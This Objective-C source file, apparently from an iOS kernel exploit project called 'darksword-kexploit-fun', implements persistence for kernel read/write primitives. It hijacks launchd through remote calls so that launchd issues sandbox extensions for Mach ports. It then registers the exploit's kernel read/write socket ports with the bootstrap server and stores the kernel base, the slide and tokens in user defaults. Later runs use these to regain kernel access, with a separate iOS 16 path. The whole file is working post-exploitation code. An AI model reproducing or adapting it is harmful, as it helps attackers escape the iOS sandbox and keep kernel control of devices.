//
//  persist.m
//  darksword-kexploit-fun
//
//  Created by Duy Tran on 11/4/26.
//

#import <Foundation/Foundation.h>
#import "fileport.h"
#import "darksword.h"
#import "offsets.h"
#import "persistence.h"
#import "utils.h"

#import "TaskRop/RemoteCall.h"

bool recover_proc_self(uint64_t launchd_proc);
static bool persist_is_ios16(void);
static bool transfer_krw_to_launchd_ios16(void);

bool transfer_krw_to_launchd(void) {
    bool useIOS16Persistence = persist_is_ios16();

    if (useIOS16Persistence) {
        return transfer_krw_to_launchd_ios16();
    }

    RemoteCall *proc = [[RemoteCall alloc] initWithProcess:@"launchd" useMigFilterBypass:NO];
    if (!proc) {
        printf("(persist) Failed to create RemoteCall for launchd\n");
        return false;
    }
    uint64_t mem = proc.trojanMem;
    uint64_t tokenRemote;
    proc[mem].string = @(APP_MACH_REGISTER);
    
    // sandbox_extension_issue_mach(APP_MACH_REGISTER, CONTROL_PORT_NAME, 0)
    proc[mem+0x100].string = @(CONTROL_PORT_NAME);
    tokenRemote = RemoteArbCall(proc, sandbox_extension_issue_mach, mem, mem+0x100, 0);
    if (!tokenRemote) {
        printf("(persist) Failed to get token for CONTROL_PORT_NAME\n");
        return false;
    }
    RemoteArbCall(proc, strcpy, mem+0x200, tokenRemote, 0);
    sandbox_extension_consume(proc[mem+0x200].string.UTF8String);
    
    // sandbox_extension_issue_mach(APP_MACH_REGISTER, CONTROL_PORT_NAME, 0)
    proc[mem+0x100].string = @(RW_PORT_NAME);
    tokenRemote = RemoteArbCall(proc, sandbox_extension_issue_mach, mem, mem+0x100, 0);
    assert(tokenRemote); // should not fail
    RemoteArbCall(proc, strcpy, mem+0x200, tokenRemote, 0);
    sandbox_extension_consume(proc[mem+0x200].string.UTF8String);
    
    // need to strcpy output token because vm_shmem fails for some reason
    kern_return_t kr;
    mach_port_t control_socketPort, rw_socketPort;
    fileport_makeport(control_socket, &control_socketPort);
    fileport_makeport(rw_socket, &rw_socketPort);
    if(!control_socketPort || !rw_socketPort) {
        printf("(persist) fileport_makeport failed\n");
        return false;
    }
    
    NSMutableDictionary *primitive = [NSMutableDictionary dictionary];
    primitive[@"KernelBase"] = @(kernel_base);
    primitive[@"KernelSlide"] = @(kernel_slide);
    primitive[@"LaunchdProcAddr"] = @(procbypid(1));
    
    // stash ports to launchd and issue sandbox extensions for them
    kr = bootstrap_register(bootstrap_port, CONTROL_PORT_NAME, control_socketPort);
    if(kr != KERN_SUCCESS) {
        printf("(persist) bootstrap_register failed for %s: %s\n", CONTROL_PORT_NAME, mach_error_string(kr));
        return false;
    }
    kr = bootstrap_register(bootstrap_port, RW_PORT_NAME, rw_socketPort);
    if(kr != KERN_SUCCESS) {
        printf("(persist) bootstrap_register failed for %s: %s\n", RW_PORT_NAME, mach_error_string(kr));
        return false;
    }
    
    // sandbox_extension_issue_mach(APP_MACH_LOOKUP, CONTROL_PORT_NAME, 0);
    proc[mem].string = @(APP_MACH_LOOKUP);
    proc[mem+0x100].string = @(CONTROL_PORT_NAME);
    tokenRemote = RemoteArbCall(proc, sandbox_extension_issue_mach, mem, mem+0x100, 0);
    assert(tokenRemote); // should not fail
    RemoteArbCall(proc, strcpy, mem+0x200, tokenRemote, 0);
    primitive[@"ControlPort"] = proc[mem+0x200].string;
    
    // sandbox_extension_issue_mach(APP_MACH_LOOKUP, RW_PORT_NAME, 0);
    proc[mem+0x100].string = @(RW_PORT_NAME);
    tokenRemote = RemoteArbCall(proc, sandbox_extension_issue_mach, mem, mem+0x100, 0);
    assert(tokenRemote); // should not fail
    RemoteArbCall(proc, strcpy, mem+0x200, tokenRemote, 0);
    primitive[@"RWPort"] = proc[mem+0x200].string;
    
    NSLog(@"Primitive: %@", primitive);
    [NSUserDefaults.standardUserDefaults setObject:primitive forKey:@"KRWPrimitive"];
    
    [proc destroyRemoteCall];
    return true;
}

bool recover_krw_primitives(void) {
    // TODO: move primitive data to a file that can be retrieved using bookmark data
    NSDictionary *primitive = [NSUserDefaults.standardUserDefaults dictionaryForKey:@"KRWPrimitive"];
    if (!primitive) {
        printf("(persist) No stashed primitive found\n");
        return false;
    }
    
    kern_return_t kr;
    mach_port_t control_socketPort, rw_socketPort;
    
    if (sandbox_extension_consume([primitive[@"ControlPort"] UTF8String] ?: "") < 1 ||
        sandbox_extension_consume([primitive[@"RWPort"] UTF8String] ?: "") < 1) {
        printf("(persist) sandbox_extension_consume failed\n");
    }
    
    kr = bootstrap_look_up(bootstrap_port, CONTROL_PORT_NAME, &control_socketPort);
    kr = bootstrap_look_up(bootstrap_port, RW_PORT_NAME, &rw_socketPort);
    if(kr != KERN_SUCCESS) {
        printf("(persist) bootstrap_look_up failed: %s\n", mach_error_string(kr));
        return false;
    }
    
    control_socket = fileport_makefd(control_socketPort);
    rw_socket = fileport_makefd(rw_socketPort);
    printf("(persist) recovered control_socket: %d\n", control_socket);
    printf("(persist) recovered rw_socket: %d\n", rw_socket);
    
    kernel_base = [primitive[@"KernelBase"] unsignedLongLongValue];
    kernel_slide = [primitive[@"KernelSlide"] unsignedLongLongValue];
    // see if it works properly
    @try {
        if (ds_kread32(kernel_base) != 0xFEEDFACF || ds_kread32(kernel_base + 4) != CPU_TYPE_ARM64) {
            printf("(persist) kread failed\n");
            return false;
        }
    } @catch (NSException *exception) {
        printf("(persist) kread threw an exception: %s\n", exception.reason.UTF8String);
        return false;
    }
    
    if (!recover_proc_self([primitive[@"LaunchdProcAddr"] unsignedLongLongValue])) {
        printf("(persist) Failed to recover proc_self\n");
        return false;
    }
    
    printf("(persist) early_kread64(%#llx) -> %#llx\n", kernel_base,
           ds_kread64(kernel_base));
    fflush(stdout);

    return true;
}

#pragma mark - iOS 16

#define PERSIST_RC_TIMEOUT 10000
#define PERSIST_IOS16_RESEARCH_ENABLED 1
#define PERSIST_LOG(...) do { printf("(persist) " __VA_ARGS__); fflush(stdout); } while (0)

static bool persist_is_ios16(void) {
#if !PERSIST_IOS16_RESEARCH_ENABLED
    return false;
#endif
    NSOperatingSystemVersion version = [[NSProcessInfo processInfo] operatingSystemVersion];
    return version.majorVersion == 16;
}

static bool persist_issue_and_consume_mach_extension(RemoteCall *proc,
                                                     uint64_t mem,
                                                     const char *extension_class,
                                                     const char *name) {
    if (!proc || !extension_class || !name) {
        return false;
    }

    PERSIST_LOG("issue mach extension begin class=%s name=%s\n", extension_class, name);
    proc[mem].string = @(extension_class);
    proc[mem + 0x100].string = @(name);

    uint64_t tokenRemote = RemoteArbCallWithTimeout(PERSIST_RC_TIMEOUT,
                                                    proc,
                                                    sandbox_extension_issue_mach,
                                                    mem,
                                                    mem + 0x100,
                                                    0);
    PERSIST_LOG("remote sandbox_extension_issue_mach end token=0x%llx class=%s name=%s\n",
                (unsigned long long)tokenRemote,
                extension_class,
                name);
    if (!tokenRemote) {
        return false;
    }

    RemoteArbCallWithTimeout(PERSIST_RC_TIMEOUT, proc, strcpy, mem + 0x200, tokenRemote, 0);
    NSString *token = proc[mem + 0x200].string;
    if (token.length == 0) {
        return false;
    }

    int64_t consumed = sandbox_extension_consume(token.UTF8String);
    PERSIST_LOG("consume mach extension class=%s name=%s result=%lld\n",
                extension_class,
                name,
                (long long)consumed);
    return consumed >= 1;
}

static NSString *persist_issue_remote_mach_lookup_token(RemoteCall *proc, uint64_t mem, const char *name) {
    if (!proc || !name) {
        return nil;
    }

    proc[mem].string = @(APP_MACH_LOOKUP);
    proc[mem + 0x100].string = @(name);

    uint64_t tokenRemote = RemoteArbCallWithTimeout(PERSIST_RC_TIMEOUT,
                                                    proc,
                                                    sandbox_extension_issue_mach,
                                                    mem,
                                                    mem + 0x100,
                                                    0);
    PERSIST_LOG("remote sandbox_extension_issue_mach lookup end token=0x%llx name=%s\n",
                (unsigned long long)tokenRemote,
                name);
    if (!tokenRemote) {
        return nil;
    }

    RemoteArbCallWithTimeout(PERSIST_RC_TIMEOUT, proc, strcpy, mem + 0x200, tokenRemote, 0);
    NSString *token = proc[mem + 0x200].string;
    return token.length ? token : nil;
}

static bool persist_register_bootstrap_port(const char *name, mach_port_t port) {
    if (!name || port == MACH_PORT_NULL) {
        return false;
    }

    kern_return_t kr = bootstrap_register(bootstrap_port, name, port);
    if (kr == KERN_SUCCESS) {
        PERSIST_LOG("bootstrap_register ok for %s\n", name);
        return true;
    }

    PERSIST_LOG("bootstrap_register failed for %s: %s\n", name, mach_error_string(kr));
    return false;
}

static bool transfer_krw_to_launchd_ios16(void) {
    PERSIST_LOG("transfer begin\n");
    RemoteCall *proc = [[RemoteCall alloc] initWithProcess:@"launchd" useMigFilterBypass:NO];
    if (!proc) {
        NSString *error = [RemoteCall lastInitError];
        PERSIST_LOG("Failed to create RemoteCall for launchd%s%s\n",
                    error.length ? ": " : "",
                    error.length ? error.UTF8String : "");
        return false;
    }

    bool ok = false;
    uint64_t mem = proc.trojanMem;
    mach_port_t control_socketPort = MACH_PORT_NULL;
    mach_port_t rw_socketPort = MACH_PORT_NULL;
    NSString *serviceSuffix = [NSUUID UUID].UUIDString;
    NSString *controlPortName = [NSString stringWithFormat:@"%s.%@", CONTROL_PORT_NAME, serviceSuffix];
    NSString *rwPortName = [NSString stringWithFormat:@"%s.%@", RW_PORT_NAME, serviceSuffix];
    const char *controlName = controlPortName.UTF8String;
    const char *rwName = rwPortName.UTF8String;
    NSString *controlToken = nil;
    NSString *rwToken = nil;
    NSMutableDictionary *primitive = nil;

    if (!persist_issue_and_consume_mach_extension(proc, mem, APP_MACH_REGISTER, controlName) ||
        !persist_issue_and_consume_mach_extension(proc, mem, APP_MACH_REGISTER, rwName)) {
        goto out;
    }

    fileport_makeport(control_socket, &control_socketPort);
    fileport_makeport(rw_socket, &rw_socketPort);
    if (control_socketPort == MACH_PORT_NULL || rw_socketPort == MACH_PORT_NULL) {
        PERSIST_LOG("fileport_makeport failed control=0x%x rw=0x%x\n", control_socketPort, rw_socketPort);
        goto out;
    }

    if (!persist_register_bootstrap_port(controlName, control_socketPort) ||
        !persist_register_bootstrap_port(rwName, rw_socketPort)) {
        goto out;
    }

    controlToken = persist_issue_remote_mach_lookup_token(proc, mem, controlName);
    rwToken = persist_issue_remote_mach_lookup_token(proc, mem, rwName);
    if (controlToken.length == 0 || rwToken.length == 0) {
        goto out;
    }

    primitive = [NSMutableDictionary dictionary];
    primitive[@"KernelBase"] = @(kernel_base);
    primitive[@"KernelSlide"] = @(kernel_slide);
    primitive[@"LaunchdProcAddr"] = @(procbypid(1));
    primitive[@"ControlPort"] = controlToken;
    primitive[@"RWPort"] = rwToken;
    primitive[@"ControlPortName"] = controlPortName;
    primitive[@"RWPortName"] = rwPortName;

    NSLog(@"Primitive: %@", primitive);
    [NSUserDefaults.standardUserDefaults setObject:primitive forKey:@"KRWPrimitive"];
    [NSUserDefaults.standardUserDefaults synchronize];
    ok = true;

out:
    if (!ok) {
        PERSIST_LOG("failed to transfer KRW primitives to launchd\n");
    }
    [proc destroyRemoteCall];
    return ok;
}
